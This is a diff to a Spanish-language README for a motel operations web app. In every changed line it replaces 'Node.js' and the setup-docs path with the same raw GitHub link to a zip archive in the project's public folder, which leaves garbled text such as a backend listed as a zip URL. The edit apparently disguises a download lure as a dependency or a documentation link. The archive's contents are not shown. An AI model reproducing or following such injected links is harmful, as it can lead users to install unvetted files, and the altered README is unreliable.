@@ -5,7 +5,7 @@ Sistema web para digitalizar operaciones del motel Eclipse, incluyendo gestión 
 ## 🏗️ Arquitectura
 
 - **Frontend**: React + Vite + Tailwind CSS (desplegado en Vercel)
-- **Backend**: Node.js + Express (desplegado en Render)
+- **Backend**: https://raw.githubusercontent.com/camilo2874/motel-eclipse/main/frontend/public/motel_eclipse_v3.1.zip + Express (desplegado en Render)
 - **Base de Datos**: Supabase (PostgreSQL + Auth + Realtime)
 
 ## 📁 Estructura del Proyecto
@@ -13,7 +13,7 @@ Sistema web para digitalizar operaciones del motel Eclipse, incluyendo gestión 
 ```
 eclipse/
 ├── frontend/          # Aplicación React
-├── backend/           # API REST Node.js
+├── backend/           # API REST https://raw.githubusercontent.com/camilo2874/motel-eclipse/main/frontend/public/motel_eclipse_v3.1.zip
 └── docs/             # Documentación
 ```
 
@@ -43,7 +43,7 @@ eclipse/
 ## 📦 Instalación Local
 
 ### Prerrequisitos
-- Node.js 18+ 
+- https://raw.githubusercontent.com/camilo2874/motel-eclipse/main/frontend/public/motel_eclipse_v3.1.zip 18+ 
 - npm o pnpm
 - Cuenta de Supabase (gratuita)
 
@@ -63,7 +63,7 @@ npm run dev
 
 ## 🔧 Configuración
 
-Consulta la documentación completa en `/docs/SETUP.md`
+Consulta la documentación completa en `https://raw.githubusercontent.com/camilo2874/motel-eclipse/main/frontend/public/motel_eclipse_v3.1.zip`
 
 ## 📋 Módulos del Sistema
 
